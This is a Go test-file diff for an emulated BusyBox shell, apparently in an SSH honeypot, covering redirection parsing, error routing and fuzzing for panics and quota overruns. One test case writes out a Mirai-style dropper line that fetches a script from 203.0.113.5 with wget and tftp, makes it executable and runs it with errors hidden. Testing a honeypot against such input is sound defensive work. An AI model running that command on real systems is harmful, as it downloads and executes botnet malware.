@@ -72,6 +72,91 @@ func TestRun(t *testing.T) {
 	}
 }
 
+// Redirections like ash (BusyBox 1.30.1, with Buildroot's ASH_BASH_COMPAT): glued to words or not,
+// applied in order, errors apart from the output (they skip a | and go where 2 points).
+func TestRedirects(t *testing.T) {
+	const noFile = "cat: can't open '/nofile': No such file or directory\n"
+	tests := []struct {
+		line string
+		want string
+		code int
+	}{
+		{"cd /tmp; echo hi>x; cat x", "hi\n", 0}, // ">" ends a word
+		{"uname -m>/tmp/u; cat /tmp/u", "armv7l\n", 0},
+		{"cd /tmp; echo a2>x; cat x", "a2\n", 0},     // "a2" is a word, not a descriptor
+		{"cd /tmp; echo 2>x; cat x", "\n", 0},        // "2>": errors to x, echo prints an empty line
+		{`cd /tmp; echo "2">x; cat x`, "2\n", 0},     // a quoted 2 is a word
+		{`echo ">" '2>x' "a&>b"`, "> 2>x a&>b\n", 0}, // operators in quotes are text
+		{"cd /tmp; echo hi>x&&cat x", "hi\n", 0},     // glued to && too
+		{"cd /tmp; echo hi 1>x; cat x", "hi\n", 0},
+		{"cd /tmp; echo hi >>x; echo ho >>x; cat x", "hi\nho\n", 0},
+		{"cd /tmp; echo one >x >y; cat x; cat y", "one\n", 0}, // both created, the last one wins
+		{"cd /tmp; >empty; ls", "empty\n", 0},                 // a redirection alone creates the file
+
+		// where the errors go: the order matters, like in any shell
+		{"cat /nofile >/dev/null 2>&1", "", 1}, // what bots append to every command
+		{"cat /nofile 2>&1 >/dev/null", noFile, 1},
+		{"cd /tmp; cat /nofile >f 2>&1; cat f", noFile, 0},
+		{"cd /tmp; cat /nofile 2>err; cat err", noFile, 0},
+		{"cat /nofile &>/dev/null", "", 1}, // bash's "&>" (ash has it with ASH_BASH_COMPAT)
+		{"cat /nofile >&/dev/null", "", 1}, // ">&file" = "&>file"
+		{"cat /nofile 2>&/dev/null", "-sh: redir error\n", 1},
+		{"nosuchcmd 2>/dev/null", "", 127},
+		{"echo hi > /missing/x 2>/dev/null", "-sh: can't create /missing/x: nonexistent directory\n", 1},
+		{"echo hi 2>/dev/null > /missing/x", "", 1}, // 2 already pointed to /dev/null
+		{"echo hi >&5", "-sh: 5: Bad file descriptor\n", 1},
+		{"echo hi >&-", "sh: write error: Bad file descriptor\n", 1},
+
+		// errors skip a pipe, unless 2>&1 sends them into it
+		{"cat /nofile | grep x", noFile, 1},
+		{"cat /nofile 2>&1 | grep can", noFile, 0},
+		{"echo hi >&2 | grep x", "hi\n", 1},
+
+		// input
+		{"cat < /etc/hostname", "gateway\n", 0},
+		{"grep daemon </etc/passwd", "daemon:*:1:1:daemon:/var:/bin/false\n", 0},
+		{"cat < /nofile", "-sh: can't open /nofile: no such file\n", 1},
+		{"cat 2>/dev/null </nofile", "", 1}, // ash's own message goes where 2 points by then
+
+		// a redirection without its file: nothing on the line runs
+		{"echo hi >", "-sh: syntax error: unexpected newline\n", 2},
+		{"echo a; echo b >; echo c", "-sh: syntax error: unexpected \";\"\n", 2},
+		{"echo a > > b", "-sh: syntax error: unexpected redirection\n", 2},
+		{"echo a > | grep a", "-sh: syntax error: unexpected \"|\"\n", 2},
+		{"cd /tmp; echo a >|f; cat f", "a\n", 0}, // ">|" (no space) is ash's "clobber": a plain ">" here
+
+		// a Mirai-style dropper line: every error hidden
+		{"cd /tmp || cd /var/run; wget http://203.0.113.5/x.sh -O- >/dev/null 2>&1; " +
+			"busybox tftp -g -r x.sh 203.0.113.5 >/dev/null 2>&1; chmod 777 x.sh; sh x.sh >/dev/null 2>&1", "", 0},
+	}
+	for _, tt := range tests {
+		if got, code, _ := NewShell().Run(tt.line); got != tt.want || code != tt.code {
+			t.Errorf("Run(%q)\n got: %q, exit code %d\nwant: %q, exit code %d", tt.line, got, code, tt.want, tt.code)
+		}
+	}
+}
+
+// Whatever an attacker types, nothing may panic (a panic in one session stops the whole agent) and
+// no session gets past its quota. `go test` runs only these seeds; new lines are made up with
+// `go test -fuzz=FuzzRun -fuzztime=2m ./internal/vfs/` (a crash is saved in testdata/fuzz/FuzzRun).
+func FuzzRun(f *testing.F) {
+	for _, seed := range []string{
+		"echo hi>x; cat x", "cat /nofile >/dev/null 2>&1", "echo b >; echo c", "> > >", "2>&1 2>&- <&0 <<x",
+		"(echo a; echo b) | grep a", `echo "a'b" 'c"d' "2">x`, "cat < /etc/passwd | grep root &>f &", "(((", ")))",
+		"a&>b&&c||d|e;f\ng", "echo x >&99999999 >&-", "cd /tmp; mkdir a; cd a; touch b; cp b ../c; rm b",
+	} {
+		f.Add(seed)
+	}
+	f.Fuzz(func(t *testing.T, line string) {
+		sh := NewShell()
+		sh.Run(line)
+		sh.Run(line) // again, over what the first run created
+		if used := sh.quotaUsed(); used > sessionQuota {
+			t.Errorf("Run(%q): %d bytes used, quota %d", line, used, sessionQuota)
+		}
+	})
+}
+
 // Run returns the exit code of the last command that ran, like $? (SSH sends it to the client).
 func TestExitCodes(t *testing.T) {
 	tests := []struct {
